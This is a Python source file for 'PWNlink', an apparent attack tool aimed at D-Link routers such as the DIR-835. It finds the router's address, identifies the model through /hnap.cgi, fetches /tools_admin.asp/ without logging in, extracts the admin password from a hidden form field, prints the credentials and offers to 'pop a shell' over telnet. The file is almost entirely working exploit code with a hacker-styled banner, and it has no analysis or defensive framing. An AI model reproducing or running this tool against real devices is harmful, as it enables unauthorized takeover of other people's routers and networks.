import socket
import requests
import struct
import os
import re

## CONFIGURATION ##


class ASCII:
    Black = "\u001b[30m"
    Red = "\u001b[31m"
    Green = "\u001b[32m"
    Yellow = "\u001b[33m"
    Blue = "\u001b[34m"
    Magenta = "\u001b[35m"
    Cyan = "\u001b[36m"
    White = "\u001b[37m"
    Reset = "\u001b[0m"

# Router class


class Router:
    ip: str
    model: str
    password: str


# Create a blank router
router = Router()

# Attack types enum


class Attacks:
    USERLESS = 0
    USER = 1


# List of supported routers, and their attack type
routers = {
    "DIR-835": Attacks.USERLESS,
    "None": Attacks.USERLESS
}


## FUNCTIONS ##


def getRouterIP() -> str:
    """ Gets the IP address of the router """

    return "192.168.3.1"

    with open("/proc/net/route") as fh:
        for line in fh:
            fields = line.strip().split()
            if fields[1] != '00000000' or not int(fields[3], 16) & 2:
                continue

            return socket.inet_ntoa(struct.pack("<L", int(fields[2], 16)))


def getRouterType(ip: str) -> str:
    """ Parse router configuration page to check router type """

    try:
        response = requests.get("http://" + ip + "/hnap.cgi").text
    except:
        return ""

    # Use RE to parse router name from login page
    title = str(re.search("<ModelName>\"(.*)\"<\/ModelName>", response).group(1))

    # Check for old-style title
    # if title == "D-LINK CORPORATION, INC | WIRELESS ROUTER | HOME":
    #     return "DIR-628"

    # if " " in title:
    #     return None

    return title


def isSupported(router_str: str) -> bool:
    """ Check if a router string is supported by this attack """

    # Return if router string is in the first element of each tuple of routers
    return str(router_str) in routers.keys()


def getPassword(ip: str, attack_type: int) -> str:
    """ Parses the router configuration for admin password """
    data = requests.get("http://" + ip + "/tools_admin.asp/").text

    password = str(re.search(
        '<input type="hidden" id="user_password_tmp" name="user_password_tmp" value="(.*)">', data).group(1))
    return password


def checkDNS() -> str:
    return socket.gethostbyname("dlinkrouter.local")


def displayMenu():
    print("\n-- Main Menu ")
    for item in menu.keys():
        print("    " + item + ") " + menu[item]["title"])


def executeMenuSelection():
    selection = input(">")

    # Execute selection
    if selection in menu:
        menu[selection]["function"]()


def spawnShell():
    # TODO: make this auto-login
    os.system(f"telnet {router.ip}")
    print("Shell closed by user")


# TUI menu
menu = {
    "1": {"title": "Display password", "function": lambda: print(router.password)},
    "2": {"title": "Pop a shell", "function": spawnShell},
    "99": {"title": "Exit", "function": exit}
}

# Main function


def main():
    # Clear screen
    os.system("clear")

    # 1337 HAXXOR Banner
    banner = """

     /$$$$$$$  /$$      /$$ /$$   /$$ /$$ /$$           /$$      
    | $$__  $$| $$  /$ | $$| $$$ | $$| $$|__/          | $$      
    | $$  \ $$| $$ /$$$| $$| $$$$| $$| $$ /$$ /$$$$$$$ | $$   /$$
    | $$$$$$$/| $$/$$ $$ $$| $$ $$ $$| $$| $$| $$__  $$| $$  /$$/
    | $$____/ | $$$$_  $$$$| $$  $$$$| $$| $$| $$  \ $$| $$$$$$/ 
    | $$      | $$$/ \  $$$| $$\  $$$| $$| $$| $$  | $$| $$_  $$ 
    | $$      | $$/   \  $$| $$ \  $$| $$| $$| $$  | $$| $$ \  $$
    |__/      |__/     \__/|__/  \__/|__/|__/|__/  |__/|__/  \__/
    """
    print(ASCII.Red + banner)

    # Check for router dns
    print(ASCII.Reset + "    [ ] Search for router via DNS...", end="\r")

    # Try to get IP addr
    try:
        router.ip = checkDNS()
    except:
        router.ip = ""

    # Check if our previous check was successful
    if router.ip != "":
        status_str = ASCII.Green + \
            "    [*] " if router.model != "" else ASCII.Yellow + "    [ ] "
        print(ASCII.Green + "    [*] " + ASCII.Reset +
              "Found router ip via DNS         ")
    else:
        # Check for router IP
        router.ip = getRouterIP()
        print(ASCII.Green + "    [*] " + ASCII.Reset +
              "Found router ip via gateway (" + router.ip + ")     ")

    # Check router type
    router.model = getRouterType(router.ip)
    status_str = ASCII.Green + \
        "    [*] " if router.model != "" else ASCII.Yellow + "   [ ] "
    print(status_str + ASCII.Reset + "Check router type")

    # Check if oruter is PWNable
    is_pwnable = isSupported(router.model)
    status_str = ASCII.Green + \
        "    [*] " if is_pwnable else ASCII.Yellow + "   [ ] "
    print(status_str + ASCII.Reset + "Check router support")

    # exit if router is not supported
    if not is_pwnable:
        print("\nRouter is not supported by PWNlink")
        exit(1)

    # Check for password
    router.password = getPassword(router.ip, routers[str(router.model)])

    # Display the creds
    print(ASCII.Green + "    [*] " + ASCII.Reset + "Acquire creds")
    print(ASCII.Green + "    [*] " + ASCII.Reset + "Parse username")
    print(ASCII.Green + "    [*] " + ASCII.Reset + "Parse password")
    print()
    print(ASCII.Green + "    - " + ASCII.Reset + "Username: admin")
    print(ASCII.Green + "    - " + ASCII.Reset + "Password: " + router.password)


# Do the python thingy
if __name__ == "__main__":
    main()
    print(ASCII.Reset)
